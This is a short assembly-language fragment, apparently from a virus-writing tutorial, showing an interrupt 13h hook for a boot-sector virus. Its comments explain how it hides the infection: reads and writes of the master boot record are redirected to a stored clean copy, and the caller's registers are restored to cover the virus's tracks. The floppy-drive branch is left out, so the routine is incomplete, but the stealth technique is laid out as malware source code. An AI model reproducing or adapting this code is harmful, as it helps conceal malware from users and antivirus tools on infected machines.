
int_13h_entry:
           pushf
           cmp dl,80h
           js  flopak  ; floppy or hard drive ?
                       ; this should hide the presence of
                       ; virus in the MBR
           push cx
           or dl,dl
           jnz  OK     ; head 0 ? If so, then if

           cmp cx,1
           jnz  OK     ;  track 0 sector 1, check critical
                       ;  functions

           cmp al,1
           ja OK       ;  stealth only when 1 sector read
           cmp ah,02h  ;  read
           jz  zvedavec
           cmp ah,0ah  ;  long read ( is not necessary )
           jz  zvedavec
           cmp ah,03h  ;  write
           jz write
           cmp ah,0bh  ;  long write (is not necessary )
           jnz OK
write:
zvedavec:  mov cl,7    ;  redirect R/W to stored MBR
OK:        call emulINT13h
           pop cx      ; we call original INT 13h with "good
                       ; parameters and we return callers CX
                       ; which covers our tracks
           jmp short VRATsa


flopak:   ....         ; here 'd be handled floppy access
          ....         ; similar to hard drive access
          ....
VRATsa:
           popf
           retf 2
emulINT13h:
           pushf
           call dword ptr cs:[original_INT13h]
           ret

